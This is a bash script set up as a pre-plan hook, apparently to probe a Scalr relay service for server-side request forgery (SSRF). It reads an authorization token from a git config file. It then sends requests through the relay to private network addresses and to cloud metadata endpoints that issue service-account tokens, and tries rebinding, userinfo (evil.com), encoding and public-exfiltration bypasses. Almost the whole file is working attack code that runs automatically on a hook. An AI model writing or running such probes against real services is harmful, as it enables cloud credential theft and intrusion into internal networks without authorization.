#!/usr/bin/env bash
# SCALRCORE-38322 SSRF gap probe — pre-plan hook.

JWT=$(grep -oP '(?<=x-relay-authorization:).+' "$XDG_CONFIG_HOME/git/config")
POOL=apool-v0p88m73bm13hgqhg
RELAY=https://relay.main.scalr.dev

run() {
  local label=$1; shift
  local code
  code=$(curl -s -o /tmp/b -w "%{http_code}" --max-time 8 \
    -H "x-relay-authorization: $JWT" \
    -H "X-Relay-Agent-Pool-ID: $POOL" \
    "$@" 2>&1)
  local body
  body=$(head -c 160 /tmp/b 2>/dev/null | tr -d '\n' | tr -c '[:print:]' ' ')
  echo "RESULT|$label|$code|$body"
}

echo "=== SSRF PROBE START ==="
echo "jwt_len=${#JWT} pool=$POOL"

run "01a-rfc1918-10"     "$RELAY/http://10.0.0.1/"
run "01b-rfc1918-192"    "$RELAY/http://192.168.1.1/"
run "01c-rfc1918-172"    "$RELAY/http://172.16.0.1/"
run "02-dns-rebind"      "$RELAY/http://x.169-254-169-254.nip.io/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
run "03a-ipv6-loop"      "$RELAY/http://[::1]:8080/"
run "03b-ipv6-ula"       "$RELAY/http://[fc00::1]/"
run "03c-ipv6-linkloc"   "$RELAY/http://[fe80::1]/"
run "04-alibaba-meta"    "$RELAY/http://100.100.100.200/latest/meta-data/"
run "05-bare-metadata"   "$RELAY/http://metadata/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
run "06a-zero-ip"        "$RELAY/http://0.0.0.0:22/"
run "06b-zero-short"     "$RELAY/http://0/"
run "07-userinfo"        "$RELAY/http://metadata.google.internal@evil.com/"
run "08-url-encoded"     --path-as-is "$RELAY/http://%6D%65%74%61data.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
run "09-public-exfil"    "$RELAY/https://httpbin.org/get"
run "CTRL-gcp-meta"      "$RELAY/http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
run "CTRL-aws-meta"      "$RELAY/http://169.254.169.254/latest/meta-data/"
run "CTRL-loopback"      "$RELAY/http://127.0.0.1/"

echo "=== SSRF PROBE END ==="
exit 0
